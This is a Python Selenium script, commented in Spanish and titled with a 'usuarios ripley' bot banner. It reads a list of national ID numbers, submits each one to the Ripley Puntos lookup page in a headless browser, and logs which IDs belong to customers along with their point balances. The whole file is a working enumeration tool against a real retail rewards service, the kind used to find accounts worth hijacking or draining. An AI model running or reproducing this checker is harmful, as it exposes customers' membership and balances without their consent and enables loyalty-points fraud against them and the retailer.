from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from getpass import getpass
import warnings
import time
import random
from pwn import *
from colorama import Fore,init
from colorama import Fore, Style
import colorama
init()
## colores 
verde = Fore.GREEN
cyan = Fore.CYAN
rojo = Fore.RED
magenta = Fore.MAGENTA
lmagenta = Fore.LIGHTMAGENTA_EX
blanco = Fore.WHITE
reset = Fore.RESET

warnings.filterwarnings("ignore", category=Warning)
############################################################
driver_chrome_ruta = 'C:\webdriver\chromedriver.exe' ### RUTA DEL CHROMEDRIVER
############################################################

text = """

   ▄• ▄▌.▄▄ · ▄• ▄▌ ▄▄▄· ▄▄▄  ▪        .▄▄ ·     ▄▄▄  ▪   ▄▄▄·▄▄▌  ▄▄▄ . ▄· ▄▌
   █▪██▌▐█ ▀. █▪██▌▐█ ▀█ ▀▄ █·██ ▪     ▐█ ▀.     ▀▄ █·██ ▐█ ▄███•  ▀▄.▀·▐█▪██▌
   █▌▐█▌▄▀▀▀█▄█▌▐█▌▄█▀▀█ ▐▀▀▄ ▐█· ▄█▀▄ ▄▀▀▀█▄    ▐▀▀▄ ▐█· ██▀·██▪  ▐▀▀▪▄▐█▌▐█▪
   ▐█▄█▌▐█▄▪▐█▐█▄█▌▐█ ▪▐▌▐█•█▌▐█▌▐█▌.▐▌▐█▄▪▐█    ▐█•█▌▐█▌▐█▪·•▐█▌▐▌▐█▄▄▌ ▐█▀·.
    ▀▀▀  ▀▀▀▀  ▀▀▀  ▀  ▀ .▀  ▀▀▀▀ ▀█▄▀▪ ▀▀▀▀     .▀  ▀▀▀▀.▀   .▀▀▀  ▀▀▀   ▀ • 

"""
bad_colors = ['LIGHTMAGENTA_EX', 'MAGENTA']
codes = vars(colorama.Fore)
colors = [codes[color] for color in codes if color in bad_colors]
colored_chars = [random.choice(colors) + char for char in text]
print(''.join(colored_chars))
print(f"{lmagenta}################################ ฿Ø₮ Ɽł₱ⱠɆɎ MHK4 #################################{blanco}")

lista_usuarios = input("LISTA DE DNI: ")
with open(lista_usuarios) as f_obj:
    lines = f_obj.readlines()

def checker_cuentas():
    for line in lines:
        document_numero = line.strip()
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_experimental_option("excludeSwitches", ["enable-logging"])
        driver = webdriver.Chrome(options=chrome_options, executable_path=driver_chrome_ruta)
        driver.get('https://www.ripleypuntos.com.pe/canjes.html')
        user_dni = driver.find_element_by_id("nroDocumentoCP")
        user_dni.send_keys(document_numero)
        time.sleep(0.3)
        boton_enviar = driver.find_element_by_xpath('//*[@id="btnEnviarCP"]').click()
        time.sleep(2)
        mensaje_account = driver.find_element_by_xpath('//*[@id="RestulConsultNothing"]/div/div[2]/div/p[1]')
        respuesta = mensaje_account.text
        if "Lamentablemente aún no tienes una Tarjeta Ripley." in respuesta:
            log.failure(f"{rojo}NO ES CLIENTE EL DNI : {document_numero}{reset}")
            pass
        else:
            puntos_acomulados = driver.find_element_by_xpath('//*[@id="puntajeTotalCP"]')
            texto_puntaje = puntos_acomulados.text
            log.success(f"SI ES CLIENTE RIPLEY {blanco}[ {lmagenta}{document_numero} {blanco}] {lmagenta}RIPLEY-GO: {cyan}{texto_puntaje}{reset}")
        driver.quit()
        pass

if __name__ == "__main__":
    checker_cuentas()